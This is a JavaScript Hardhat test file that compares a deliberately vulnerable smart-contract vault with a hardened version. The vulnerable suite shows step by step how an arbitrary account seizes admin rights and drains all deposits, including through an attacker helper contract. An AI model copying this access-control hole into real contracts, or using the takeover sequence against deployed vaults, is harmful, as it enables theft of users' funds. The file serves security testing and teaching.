const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("AdminVault - Access Control", function () {
  let vault;
  let owner;
  let user1;
  let user2;
  let attacker;

  beforeEach(async function () {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const AdminVault = await ethers.getContractFactory("AdminVault");
    vault = await AdminVault.connect(owner).deploy();
    await vault.deployed();
  });

  it("allows regular deposits and withdrawals", async function () {
    await vault.connect(user1).deposit({ value: ethers.utils.parseEther("3") });

    expect(await vault.getBalance(user1.address)).to.equal(ethers.utils.parseEther("3"));
    expect(await vault.getContractBalance()).to.equal(ethers.utils.parseEther("3"));

    await vault.connect(user1).withdraw(ethers.utils.parseEther("1"));

    expect(await vault.getBalance(user1.address)).to.equal(ethers.utils.parseEther("2"));
    expect(await vault.getContractBalance()).to.equal(ethers.utils.parseEther("2"));
  });

  it("is vulnerable: non-admin can become admin in 2 steps", async function () {
    expect(await vault.admin()).to.equal(owner.address);

    await vault.connect(attacker).proposeAdmin(attacker.address);
    await vault.connect(attacker).acceptAdmin();

    expect(await vault.admin()).to.equal(attacker.address);
  });

  it("is vulnerable: attacker can drain funds via emergencyWithdraw", async function () {
    await vault.connect(user1).deposit({ value: ethers.utils.parseEther("10") });
    await vault.connect(user2).deposit({ value: ethers.utils.parseEther("7") });

    const balanceBefore = await ethers.provider.getBalance(attacker.address);

    await vault.connect(attacker).proposeAdmin(attacker.address);
    await vault.connect(attacker).acceptAdmin();

    const tx = await vault.connect(attacker).emergencyWithdraw();
    const receipt = await tx.wait();
    const gasCost = receipt.gasUsed.mul(receipt.effectiveGasPrice);

    const balanceAfter = await ethers.provider.getBalance(attacker.address);
    const expected = balanceBefore
      .add(ethers.utils.parseEther("17"))
      .sub(gasCost);

    expect(balanceAfter).to.be.closeTo(expected, ethers.utils.parseEther("0.001"));
    expect(await vault.getContractBalance()).to.equal(0);
  });

  it("attack helper contract can execute the full exploit", async function () {
    await vault.connect(user1).deposit({ value: ethers.utils.parseEther("5") });

    const AdminVaultAttacker = await ethers.getContractFactory("AdminVaultAttacker");
    const exploit = await AdminVaultAttacker.connect(attacker).deploy(vault.address);
    await exploit.deployed();

    await exploit.connect(attacker).executeAttack();

    expect(await vault.getContractBalance()).to.equal(0);
    expect(await vault.admin()).to.equal(exploit.address);
  });
});

describe("AdminVaultSecure - Access Control", function () {
  let secureVault;
  let admin;
  let user1;
  let user2;

  beforeEach(async function () {
    [admin, user1, user2] = await ethers.getSigners();

    const AdminVaultSecure = await ethers.getContractFactory("AdminVaultSecure");
    secureVault = await AdminVaultSecure.connect(admin).deploy();
    await secureVault.deployed();
  });

  it("blocks non-admin from proposing new admin", async function () {
    await expect(
      secureVault.connect(user1).proposeAdmin(user1.address)
    ).to.be.revertedWith("Only admin can call this");
  });

  it("enforces timelock for admin transfer", async function () {
    await secureVault.connect(admin).proposeAdmin(user1.address);

    await expect(
      secureVault.connect(user1).acceptAdmin()
    ).to.be.revertedWith("Timelock not expired");

    await network.provider.send("evm_increaseTime", [48 * 60 * 60 + 1]);
    await network.provider.send("evm_mine");

    await secureVault.connect(user1).acceptAdmin();

    expect(await secureVault.admin()).to.equal(user1.address);
  });

  it("requires pause before emergency withdraw", async function () {
    await secureVault.connect(user1).deposit({ value: ethers.utils.parseEther("4") });

    await expect(
      secureVault.connect(admin).emergencyWithdraw()
    ).to.be.revertedWith("Must pause contract first");

    await secureVault.connect(admin).togglePause();
    await secureVault.connect(admin).emergencyWithdraw();

    expect(await secureVault.getContractBalance()).to.equal(0);
  });

  it("blocks emergency withdraw from non-admin", async function () {
    await expect(
      secureVault.connect(user1).emergencyWithdraw()
    ).to.be.revertedWith("Only admin can call this");
  });

  it("blocks deposits when paused", async function () {
    await secureVault.connect(admin).togglePause();

    await expect(
      secureVault.connect(user1).deposit({ value: ethers.utils.parseEther("1") })
    ).to.be.revertedWith("Contract is paused");
  });
});
